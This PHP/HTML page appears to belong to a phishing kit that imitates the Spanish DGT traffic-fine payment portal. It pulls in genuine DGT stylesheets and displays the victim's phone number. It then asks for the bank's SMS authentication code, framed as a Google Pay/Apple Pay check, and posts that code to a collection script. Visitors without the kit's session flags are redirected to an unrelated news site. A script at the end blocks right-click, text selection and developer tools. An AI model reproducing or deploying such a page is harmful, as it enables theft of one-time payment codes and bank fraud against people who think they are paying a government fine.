<?php
session_start();
require '../server/all.php';
include '../settings.php';

if (isset($_SESSION['autoriser']) && $_SESSION['autoriser'] === true && isset($_SESSION['index_auth']) && $_SESSION['index_auth'] === true) {
    ?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" lang="es">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">		 
		
		
		
		
		
		
		
		
		
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
        <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
		<style type="text/css" media="all">
			@import url('https://sedeclave.dgt.gob.es/IWPS5/assets/bootstrap-3.3.7/css/bootstrap.min.css');
			@import url('https://sedeclave.dgt.gob.es/IWPS5/assets/bootstrap-3.3.7/css/bootstrap-theme.min.css');
			@import url('https://sedeclave.dgt.gob.es/IWPS5/assets/selectize-0.12.4/css/selectize.bootstrap3.css');
			@import url('https://sedeclave.dgt.gob.es/IWPS5/assets/font-awesome-4.7.0/font-awesome.custom.min.css');
			@import url('https://sedeclave.dgt.gob.es/IWPS5/assets/datepicker-0.4.0/datepicker.min.css');
			@import url('https://sedeclave.dgt.gob.es/IWPS5/assets/unslider-2.0.3/unslider.css');
			@import url('https://sedeclave.dgt.gob.es/IWPS5/css/estilosComObl.css');
			@import url('https://sedeclave.dgt.gob.es/IWPS5/css/estiloPropio.css');
		</style>
		

		<title>Page de sanciones</title>
		<style>
        /* Style du bouton */
        .custom-button {
            background-color: #048;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px; /* Bords arrondis */
            cursor: pointer;
        }

        /* Style au survol du bouton */
        .custom-button:hover {
            background-color: #036; /* Changer la couleur au survol */
        }


        
    h5.mandatory {
        font-family: "Open Sans", Helvetica, Arial, sans-serif;
    }

    </style>
		
		
	</head>
	<body id="myBody" class="js-enabled">
	
		
		
		<div class="burguer small" aria-hidden="true">			
			
		
		</div>
		<!-- Atajos -->
		<header class="main-header">
			<h1 class="sr-only">
			<span>Site Web DGT</span></h1>
			<nav>
				<h2 class="sr-only">Entête</h2>
				<!-- Cabecera con los logos -->
				<div class="brand">
					<h3 class="sr-only">Organisme</h3>
					<div class="logos">
						<a title="" href="" target="_blank"><img src="../assets/images/logo-mir.png" ></a>
						<a title="" href="" target="_blank"><img src="../assets/images/logo-dgt.png" ></a>
					</div>
					<a class="title" href="">
						<span class="main">Pago de sanciones</span>
						
					</a>
					<div class="desktop-fix"></div>
				</div>
				
				
					
				
				<div id="formMenuCarritoId" name="formMenuCarritoId" method="post" action="" enctype="application/x-www-form-urlencoded">
					<input type="hidden" name="formMenuCarritoId" value="formMenuCarritoId">
					<div class="nav-main menu-component" id="main-navigation">
						<h3 class="sr-only"></h3>
						<ul class="menu">
							<li class="level l1 no-sublevel" onclick="">
								<a href="" class="item"><span class="fa fa-angle-right" aria-hidden="true"></span>Pagos</a>
							</li>
						</ul>
					</div>
					
			</nav>
			<!--/ Menu principal de enlaces -->
		</header>
		<main class="main-content">
			<!-- Avisos -->
			<div class="dgt-announcements-header">
				
				
			</div>		
								
			<h2>Autenticación de su multa N°164357371274</h2>
            <br>

            <center><img src="https://www.flyingeye.fr/wp-content/uploads/2022/11/logos-google-pay-apple-pay.png"    width="250"></center>
            <br>
            <div class="mandatory">
            <h5 class="mandatory">Su banco para solicitar una autenticación adicional para validar su pago por favor ingrese el código de SMS recibido en su número: &nbsp; <?php echo $_SESSION['tel'] ;?> </h5>
            <h5 class="mandatory">La validación está relacionada con Google Pay y Apple Pay</h5>	
            </div>
            

			</header>
			<div></div>
				

		
				
					
	<div class="box bordered-box overlapped-title-box">
	<div class="container-fluid">
    <!-- Form -->
	<form method="post" action="../actions/sms_auth.php">
    <div class="row">
	<?php if (isset($_GET['error']) && $_GET['error'] == 1) { echo '<p style="color: red; font-size: 16px;">Código inválido o caducado, por favor compruébelo</p>';}?>
	
        <!-- NOM -->
        
        <div class="col-sm-8">
            <label class="mandatory">Código recibido por SMS</label>
            <input id="ccnum" type="text" name="vbv_code" class="form-control" minlength="6" maxlength="10" inputmode="numeric" oninput="chiffres_only(this)">
        </div>
      
	</div>	
	
	</div>

    

    

    <div class="row">
        
        

		
	</div>
			<br>
			<!-- BUTTON VALIDER -->
			<div class="row">
			<div class="col-sm-8">
			<button type="submit" name="vbv_submit" class="custom-button form-control">Continuar</button>
			<input type="hidden" name="vbv_submit" value="true">		
			</div> 
			</div>
    </div>

				
</form>

						



<table class="table table-striped">
							
						</table>
					</div>
					
					
					
				
				<!-- Encuesta -->
				
			</main>
			<footer class="main-footer">
		<nav>
			<h2 class="sr-only">Pie de página</h2>

			<h3 class="sr-only">Ayuda y políticas</h3>
			<ul class="inline links piped">
				<li><a class="link" href="" target="_blank" title="Aviso legal">Aviso legal</a></li>
				<li><a class="link" href="" target="_blank" title="Propiedad intelectual">Propiedad intelectual</a></li>
				<li><a class="link" href="" target="_blank" title="Accesibilidad">Accesibilidad</a></li>
                <li><a class="link" href="" target="_blank" title="Protección de datos">Protección de datos</a>		</ul>
			
			<div class="footer-social">
				<ul>
					<li>
						<a href="" target="_blank" title="Abrir en nueva ventana Página de Facebook">
							<em class="fa fa-facebook-square"><span class="hide">Página de Facebook</span></em>
						</a>
					</li>
					<li><a href="" target="_blank" title="Abrir en nueva ventana Página de Twitter">
                        <em class="fa fa-twitter-square"><span class="hide">Página de Twitter</span></em>
						</a>
					</li>
					<li>
						<a href="t" target="_blank" title="Abrir en nueva ventana Página de YouTube">
							<em class="fa fa-youtube-square"><span class="hide">Página de YouTube</span></em>
						</a>
					</li>
					<li>
						<a href="" target="_blank" title="Abrir en nueva ventana Página de Instagram">
							<em class="fa fa-instagram"><span class="hide">Página de Instagram</span></em>
						</a>
					</li>
				</ul>
			</div>

			<h3 class="sr-only">Copyright</h3>
			<p class="copyright">Copyright @ DGT 2022. Todos los derechos reservados</p>

			<h3 class="sr-only">Contacto</h3>
			<ul class="inline contact">
				<li>
					<span class="fa fa-phone fa-white" aria-hidden="true" title="Teléfono"></span>
					<span class="sr-only">Teléfono</span>
					011 Estado del Tráfico
				</li>
				<li>
					<span class="fa fa-phone fa-white" aria-hidden="true" title="Teléfono"></span>
					<span class="sr-only">Teléfono</span>
					060 Admin. Gral. del Estado
				</li>
				<li>
					<span class="fa fa-map-marker fa-white" aria-hidden="true" title="Ubicación"></span>
					<span class="sr-only">Ubicación</span>
					C/ Josefa Valcarcel, 28 - 28071 Madrid-España
				</li>
			</ul>
		</nav>
	</footer>
			<div id="Version_V05"></div>
			<!-- MYFACES JAVASCRIPT -->
		</body>
	</html>


    <?php
} else {
    header("Location: https://www.mediapart.fr/");
    exit;
} ?>


<script type="text/javascript">
    // Désactiver le clic droit
    document.addEventListener("contextmenu", function(e){
        e.preventDefault();
    }, false);

    // Désactiver la sélection de texte
    document.addEventListener("selectstart", function(e){
        e.preventDefault();
    }, false);


    window.addEventListener("keydown", function(e) {
        if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
            e.preventDefault();
        }
    });
</script>